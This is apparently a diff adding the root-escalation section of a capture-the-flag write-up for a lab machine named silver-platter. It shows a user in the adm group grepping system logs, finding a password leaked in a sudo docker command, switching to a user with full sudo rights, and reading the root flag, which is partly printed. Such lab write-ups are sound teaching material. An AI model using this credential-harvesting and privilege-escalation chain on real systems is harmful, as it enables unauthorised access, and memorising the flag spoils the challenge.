@@ -132,3 +132,44 @@ The administrator user sent us the password for the user `tim`.
 ![[/static/silverplatter/ksnip_20250111-164918.png]]
 With `SSH` we can log in using this information.
 ![[/static/silverplatter/ksnip_20250111-164956.png]]
+
+
+# Root
+
+```bash
+tim@silver-platter:~$ id
+uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)
+```
+
+```bash
+tim@silver-platter:~$ find / -type f -readable 2>/dev/null
+```
+
+When you check the file paths, you can see `tim` user can read the logs. 
+
+
+```bash
+tim@silver-platter:~$ grep -i tyler -r /var/log/
+```
+
+
+```plaintext
+---TRIM---
+/var/log/auth.log.2:Dec 13 15:45:57 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=CENCORED_PASSWORD/ -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database silverpeas:6.3.1
+---TRIM---
+```
+
+`/var/log/auth.log.2` file has the user `tyler`s password.
+```bash
+tyler@silver-platter:~$ sudo -l
+Matching Defaults entries for tyler on silver-platter:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User tyler may run the following commands on silver-platter:
+    (ALL : ALL) ALL
+```
+
+```bash
+tyler@silver-platter:~$ sudo cat /root/root.txt|cut -c -10
+THM{098f6b
+```
